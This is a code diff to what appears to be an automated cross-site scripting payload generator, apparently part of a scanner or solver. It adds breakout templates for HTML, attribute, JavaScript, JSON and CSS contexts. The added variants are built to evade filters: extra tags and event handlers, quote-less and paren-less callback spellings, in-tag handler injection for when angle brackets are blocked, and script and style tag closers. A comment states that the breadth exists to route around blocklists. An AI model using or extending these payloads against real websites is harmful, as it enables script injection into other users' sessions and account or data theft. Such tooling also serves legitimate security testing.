@@ -182,19 +182,21 @@ class BreakoutRecipe:
 
 
 # Reusable slot alphabets — breadth here is what gives the solver room to route around a blocklist.
-_TAGS = ["img", "svg", "video", "audio", "details", "iframe", "object", "body", "input"]
+_TAGS = ["img", "svg", "video", "audio", "details", "iframe", "object", "body", "input", "marquee", "select", "textarea"]
 _HANDLERS = [
     "onerror", "onload", "onpointerover", "onpointerenter", "onfocus",
-    "ontoggle", "onanimationstart", "onbegin", "onmouseover",
+    "ontoggle", "onanimationstart", "onbegin", "onmouseover", "onstart",
+    "onwheel", "ontouchstart", "oncopy",
 ]
 
 
 def _callback_slots(token: str) -> List[str]:
-    """Spellings of the callback invocation — includes a paren-less tagged-template form."""
+    """Spellings of the callback invocation — includes paren-less and quote-less forms."""
     return [
         f"{CALLBACK}('{token}')",
         f'{CALLBACK}("{token}")',
-        f"{CALLBACK}`{token}`",   # survives when '(' or ')' is blocked
+        f"{CALLBACK}`{token}`",          # survives when '(' or ')' is blocked
+        f"{CALLBACK}(/{token}/.source)", # survives when quotes and backticks are blocked
     ]
 
 
@@ -215,15 +217,46 @@ def _recipes_for_context(context: str, token: str) -> List[BreakoutRecipe]:
         )
 
     if ctx == "HTML_TEXT" or ctx in ("RICH_TEXT_HTML", "MARKDOWN_RENDERER", "COMMENT_BLOCK"):
-        prefix = "--><!-->" if ctx == "COMMENT_BLOCK" else ""
-        return [tag_handler_recipe(prefix, f"html_tag_handler", "inject a fresh element + event handler")]
+        if ctx == "COMMENT_BLOCK":
+            return [
+                tag_handler_recipe("--><!-->", "comment_block_breakout", "close comment then inject element"),
+                tag_handler_recipe("--!><!-->", "comment_block_alt_breakout", "HTML5 alt comment close and inject element"),
+            ]
+        return [tag_handler_recipe("", "html_tag_handler", "inject a fresh element + event handler")]
 
     if ctx == "ATTR_QUOTED_DOUBLE":
-        return [tag_handler_recipe('">', "attr_dq_breakout", "close the double-quoted attribute then inject")]
+        return [
+            tag_handler_recipe('">', "attr_dq_breakout", "close the double-quoted attribute then inject"),
+            BreakoutRecipe(
+                name="attr_dq_in_tag_handler",
+                segments=['" ', ("slot", "handler"), "=", ("slot", "cb"), ' autofocus="'],
+                slots={**handler_slot, "cb": cb},
+                required=['"', "="],
+                note="in-tag event handler injection when angle brackets are filtered",
+            ),
+        ]
     if ctx == "ATTR_QUOTED_SINGLE":
-        return [tag_handler_recipe("'>", "attr_sq_breakout", "close the single-quoted attribute then inject")]
+        return [
+            tag_handler_recipe("'>", "attr_sq_breakout", "close the single-quoted attribute then inject"),
+            BreakoutRecipe(
+                name="attr_sq_in_tag_handler",
+                segments=["' ", ("slot", "handler"), "=", ("slot", "cb"), " autofocus='"],
+                slots={**handler_slot, "cb": cb},
+                required=["'", "="],
+                note="in-tag event handler injection when angle brackets are filtered",
+            ),
+        ]
     if ctx == "ATTR_BACKTICK":
-        return [tag_handler_recipe("`>", "attr_bt_breakout")]
+        return [
+            tag_handler_recipe("`>", "attr_bt_breakout"),
+            BreakoutRecipe(
+                name="attr_bt_in_tag_handler",
+                segments=["` ", ("slot", "handler"), "=", ("slot", "cb"), " autofocus=`"],
+                slots={**handler_slot, "cb": cb},
+                required=["`", "="],
+                note="in-tag backtick handler when angle brackets are filtered",
+            ),
+        ]
     if ctx == "ATTR_UNQUOTED":
         # No quote to close — inject a new handler attribute directly.
         return [BreakoutRecipe(
@@ -245,28 +278,52 @@ def _recipes_for_context(context: str, token: str) -> List[BreakoutRecipe]:
 
     if ctx in ("JS_STRING_DOUBLE", "JS_STRING_SINGLE"):
         q = '"' if ctx.endswith("DOUBLE") else "'"
-        return [BreakoutRecipe(
-            name=f"js_string_breakout_{q}",
-            segments=[q + ";", ("slot", "cb"), ";//"],
-            slots={"cb": cb},
-            required=[q, ";"],
-            note="close the JS string literal and run a statement",
-        )]
+        return [
+            BreakoutRecipe(
+                name=f"js_string_breakout_{q}",
+                segments=[q + ";", ("slot", "cb"), ";//"],
+                slots={"cb": cb},
+                required=[q, ";"],
+                note="close the JS string literal and run a statement",
+            ),
+            tag_handler_recipe("</script>", f"js_string_script_breakout_{q}", "break out of enclosing script tag when quotes are filtered"),
+        ]
     if ctx == "JS_TEMPLATE_LITERAL":
-        return [BreakoutRecipe(
-            name="js_template_interpolation",
-            segments=["${", ("slot", "cb"), "}"],
-            slots={"cb": cb},
-            required=["${"],
-            note="inject into a template-literal interpolation",
-        )]
+        return [
+            BreakoutRecipe(
+                name="js_template_interpolation",
+                segments=["${", ("slot", "cb"), "}"],
+                slots={"cb": cb},
+                required=["${"],
+                note="inject into a template-literal interpolation",
+            ),
+            tag_handler_recipe("</script>", "js_template_script_breakout", "break out of script block when interpolation is filtered"),
+        ]
     if ctx == "JS_BLOCK" or ctx == "JS_IDENTIFIER":
-        return [BreakoutRecipe(
-            name="js_statement",
-            segments=[";", ("slot", "cb"), ";"],
-            slots={"cb": cb},
-            required=[";"],
-        )]
+        return [
+            BreakoutRecipe(
+                name="js_statement",
+                segments=[";", ("slot", "cb"), ";"],
+                slots={"cb": cb},
+                required=[";"],
+            ),
+            tag_handler_recipe("</script>", "js_block_script_breakout", "break out of script block when statement is filtered"),
+        ]
+
+    if ctx in ("STYLE_BLOCK", "CSS_STYLE_BLOCK"):
+        return [tag_handler_recipe("</style>", "style_block_breakout", "close style block and inject element")]
+
+    if ctx == "JSON_VALUE":
+        return [
+            tag_handler_recipe("</script>", "json_script_breakout", "close enclosing script tag around JSON"),
+            BreakoutRecipe(
+                name="json_string_breakout",
+                segments=['";', ("slot", "cb"), ';//'],
+                slots={"cb": cb},
+                required=['"', ";"],
+                note="break out of JSON string literal",
+            ),
+        ]
 
     if ctx in ("URL_HREF", "URL_SRC"):
         return [BreakoutRecipe(
